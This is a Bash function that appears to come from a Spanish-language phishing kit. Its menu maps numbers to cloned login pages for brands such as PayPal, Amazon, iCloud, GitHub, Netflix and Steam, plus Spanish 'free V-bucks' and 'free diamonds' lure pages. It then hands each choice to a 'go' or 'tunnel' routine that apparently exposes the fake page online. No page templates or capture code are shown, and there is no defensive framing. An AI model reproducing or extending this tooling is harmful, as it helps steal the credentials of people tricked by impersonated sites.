check_page(){
    if [[ $opc == "1" || $opc == "01" ]];then
        web="amazon"
        go

    elif [[ $opc == "2" || $opc == "02" ]];then
        echo "Error, esta pagina a sido eliminada"

    elif [[ $opc == "3" || $opc == "03" ]];then
        web="badoo"
        go

    elif [[ $opc == "4" || $opc == "04" ]];then
        web="devianart"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "5" || $opc == "05" ]];then
        web="ebay"
        go

    elif [[ $opc == "6" || $opc == "06" ]];then
        list_fb

    elif [[ $opc == "7" || $opc == "07" ]];then
        web="foursquare"
        go

    elif [[ $opc == "8" || $opc == "08" ]];then
        web="github"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "9" || $opc == "09" ]];then
        list_goo

    elif [[ $opc == "10" ]];then
        web="icloud"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "11" ]];then
        web="imgur"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "12" ]];then
        web="instafollowers"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "13" ]];then
        list_insta

    elif [[ $opc == "14" ]];then
        web="linkedin"
        go

    elif [[ $opc == "15" ]];then
        web="microsoft"
        go

    elif [[ $opc == "16" ]];then
        web="myspace"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "17" ]];then
        web="netflix"
        go

    elif [[ $opc == "18" ]];then
        web="origin"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "19" ]];then
        web="paypal"
        go

    elif [[ $opc == "20" ]];then
        web="pinterest"
        go

    elif [[ $opc == "21" ]];then
        web="playstation"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "22" ]];then
        web="primevideo"
        go

    elif [[ $opc == "23" ]];then
        web="proton"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "24" ]];then
        web="reddit"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "25" ]];then
        web="shopify"
        go

    elif [[ $opc == "26" ]];then
        web="snapchat"
        go

    elif [[ $opc == "27" ]];then
        web="spotify"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "28" ]];then
        web="steam"
        go

    elif [[ $opc == "29" ]];then
        web="twitch"
        go

    elif [[ $opc == "30" ]];then
        web="twitter"
        go

    elif [[ $opc == "31" ]];then
        web="verizon"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "32" ]];then
        web="vimeo"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "33" ]];then
        web="vk"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "34" ]];then
        op="español"
        list_wifi

    elif [[ $opc == "35" ]];then
        web="wordpress"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "36" ]];then
        web="yahoo"
        go

    elif [[ $opc == "37" ]];then
        web="yandex"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "38" ]];then
        web="yelp"
        go

    elif [[ $opc == "39" ]];then
        web="adobe"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "40" ]];then
        web="pornhub"
        op="ingles"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "41" ]];then
        web="pavosgratis"
        op="español"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "42" ]];then
        web="diamantesgratis"
        op="español"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "43" ]];then
        web="generadorderecursos"
        op="español"
        ruta_carpeta="websites/$web"
        tunnel

    elif [[ $opc == "99" ]];then
        menu_help

    elif [[ $opc == "00" ]];then
        sleep 0.5
        exit 1

    else
        echo -e "$r [!]$b Opción invalida, $opc"
        sleep 0.5
        options
    fi
}